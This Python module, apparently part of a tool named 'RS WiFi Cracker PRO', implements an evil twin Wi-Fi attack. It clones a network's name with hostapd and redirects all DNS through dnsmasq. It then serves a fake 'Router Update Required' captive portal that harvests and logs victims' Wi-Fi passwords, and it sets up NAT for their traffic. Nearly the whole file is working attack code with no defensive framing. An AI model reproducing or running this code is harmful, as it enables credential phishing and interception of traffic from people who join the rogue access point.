#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO - Evil Twin Attack Module"""
import os
import time
import subprocess
import threading
import socket
from typing import Optional
from datetime import datetime


class EvilTwin:
    """Evil Twin Access Point module"""
    
    def __init__(self, interface: str, logger, db=None):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.running = False
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.http_server = None
        self.captured_credentials = []
    
    def start(self, essid: str, channel: int = 1, password: str = None,
              capture_portal: bool = True) -> bool:
        """Start Evil Twin AP"""
        self.logger.info(f"Starting Evil Twin AP: {essid}...")
        
        # Kill interfering processes
        subprocess.run(['killall', 'hostapd', 'dnsmasq', 'wpa_supplicant'], 
                      capture_output=True)
        
        # Create hostapd config
        hostapd_conf = f"""interface={self.interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
ieee80211n=1
"""
        
        if password:
            hostapd_conf += f"""wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""
        
        hostapd_file = "/tmp/evil_twin_hostapd.conf"
        with open(hostapd_file, 'w') as f:
            f.write(hostapd_conf)
        
        # Create dnsmasq config
        dnsmasq_conf = f"""interface={self.interface}
dhcp-range=192.168.100.2,192.168.100.100,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,8.8.8.8,8.8.4.4
address=/#/192.168.100.1
"""
        
        dnsmasq_file = "/tmp/evil_twin_dnsmasq.conf"
        with open(dnsmasq_file, 'w') as f:
            f.write(dnsmasq_conf)
        
        # Configure interface
        subprocess.run(['ip', 'addr', 'add', '192.168.100.1/24', 'dev', self.interface],
                      capture_output=True)
        subprocess.run(['ip', 'link', 'set', self.interface, 'up'], capture_output=True)
        
        # Enable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        
        # Start dnsmasq
        self.dnsmasq_proc = subprocess.Popen(
            ['dnsmasq', '-C', dnsmasq_file, '-d'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        
        # Start hostapd
        self.hostapd_proc = subprocess.Popen(
            ['hostapd', hostapd_file],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        
        self.running = True
        self.logger.success("Evil Twin AP started!")
        
        if capture_portal:
            self._start_captive_portal()
        
        return True
    
    def _start_captive_portal(self):
        """Start captive portal for credential capture"""
        self.logger.info("Starting captive portal...")
        
        # Create simple HTTP server
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Router Login</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; padding: 50px; }
        .login { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; }
        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login">
        <h2>Router Update Required</h2>
        <p>Enter your WiFi password to continue:</p>
        <form action="/submit" method="POST">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>'''
        
        portal_dir = "/tmp/portal"
        os.makedirs(portal_dir, exist_ok=True)
        
        with open(os.path.join(portal_dir, "index.html"), 'w') as f:
            f.write(html)
        
        # Simple HTTP server thread
        def run_server():
            import http.server
            import socketserver
            
            class PortalHandler(http.server.SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    self.logger = EvilTwin._get_logger()
                    super().__init__(*args, directory=portal_dir, **kwargs)
                
                def do_POST(self):
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode()
                    
                    # Parse password
                    if 'password=' in post_data:
                        password = post_data.split('password=')[1].split('&')[0]
                        EvilTwin._add_credential(password)
                        self.logger.success(f"Captured password: {password}")
                    
                    # Send response
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<h1>Connection successful!</h1>')
            
            with socketserver.TCPServer(("", 80), PortalHandler) as httpd:
                httpd.serve_forever()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        self.logger.info("Captive portal running on port 80")
    
    _logger = None
    _credentials = []
    
    @classmethod
    def _get_logger(cls):
        return cls._logger
    
    @classmethod
    def _add_credential(cls, cred):
        cls._credentials.append(cred)
    
    def get_captured_credentials(self) -> list:
        """Get captured credentials"""
        return self._credentials.copy()
    
    def stop(self):
        """Stop Evil Twin AP"""
        self.running = False
        
        if self.hostapd_proc:
            self.hostapd_proc.terminate()
        
        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
        
        subprocess.run(['killall', 'hostapd', 'dnsmasq'], capture_output=True)
        self.logger.info("Evil Twin stopped")
    
    def setup_nat(self, out_interface: str):
        """Setup NAT for internet access"""
        subprocess.run([
            'iptables', '-t', 'nat', '-A', 'POSTROUTING',
            '-o', out_interface, '-j', 'MASQUERADE'
        ], capture_output=True)
        
        subprocess.run([
            'iptables', '-A', 'FORWARD',
            '-i', self.interface, '-j', 'ACCEPT'
        ], capture_output=True)
        
        self.logger.info("NAT configured")
